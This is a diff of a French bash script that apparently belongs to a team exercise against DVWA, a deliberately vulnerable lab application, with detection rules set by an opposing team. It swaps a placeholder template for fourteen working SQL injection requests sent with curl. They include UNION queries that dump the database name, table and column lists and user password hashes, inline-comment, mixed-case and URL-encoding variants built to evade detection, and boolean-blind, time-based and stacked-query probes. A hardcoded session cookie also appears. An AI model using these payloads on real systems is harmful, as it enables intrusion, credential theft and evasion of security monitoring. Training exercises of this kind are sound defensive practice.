@@ -1,45 +1,88 @@
 #!/bin/bash
-# =============================================================================
-#  payloads.sh — Equipe 2 — Round 1 (Injection SQL)
-#
-#  Usage (apres avoir deploye les regles adverses) :
-#    bash attacks/equipe-2/payloads.sh <ip_dvwa>
-#
-#  Par defaut cible : dvwa (nom Docker)
-# =============================================================================
+TARGET="${1:-localhost}"
+PORT="8080"
+COOKIE="PHPSESSID=cqcllo8bdvm046l3fvl96cqe7i; security=low"
 
-TARGET="${1:-dvwa}"
-PORT="80"
-COOKIE_FILE="/tmp/dvwa_eq2.txt"
-
-echo "=== Equipe 2 — Attaques R1 (Injection SQL) ==="
+echo "=== Equipe 2 - Attaques R1 (Injection SQL) ==="
 echo "Cible : $TARGET:$PORT"
 echo ""
 
-# Authentification DVWA
-curl -s -c "$COOKIE_FILE" \
-  -d "username=admin&password=password&Login=Login" \
-  "http://$TARGET:$PORT/login.php" -L -o /dev/null
-echo "[*] Cookie recupere"
+# --- PAYLOADS CLASSIQUES (faciles à détecter) ---
+
+echo "[1] OR always-true basique"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[2] UNION SELECT 2 colonnes"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,2--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[3] UNION SELECT database()"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,database()--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[4] UNION SELECT user()"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),version()--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[5] Dump tables information_schema"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+table_name,2+FROM+information_schema.tables--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[6] Dump colonnes users"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+column_name,2+FROM+information_schema.columns+WHERE+table_name='users'--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[7] Dump passwords"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+# --- PAYLOADS EVASION (plus difficiles à détecter) ---
+
+echo "[8] Evasion commentaire inline UN/**/ION"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+UN/**/ION+SEL/**/ECT+1,database()--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[9] Evasion casse mixte"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+uNiOn+SeLeCt+user(),database()--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[10] Evasion encodage URL"
+curl -s -b "$COOKIE" \
+  --data-urlencode "id=1' UNION SELECT user(),database()-- -" \
+  --data-urlencode "Submit=Submit" \
+  --get \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[11] Boolean blind AND 1=1"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+1=1--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[12] Boolean blind AND 1=2"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+1=2--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[13] Time-based blind SLEEP(3)"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1'+AND+SLEEP(3)--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
+echo "[14] Stacked query tentative"
+curl -s -b "$COOKIE" \
+  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=1';SELECT+SLEEP(2)--+-&Submit=Submit" \
+  -o /dev/null -w "    HTTP %{http_code}\n"
+
 echo ""
-
-# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
-echo "[1] Payload basique..."
-RESULT=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
-  -o /dev/null -w "%{http_code}")
-echo "    HTTP $RESULT"
-
-# ── Payload 2 ───────────────────────────────────────────────────────────────
-echo "[2] Payload avance..."
-RESULT2=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST2&Submit=Submit" \
-  -o /dev/null -w "%{http_code}")
-echo "    HTTP $RESULT2"
-
-# ── Payload 3 ───────────────────────────────────────────────────────────────
-echo "[3] Payload evasion..."
-# A completer
-
-echo ""
-echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
+echo "=== Fin des attaques ==="
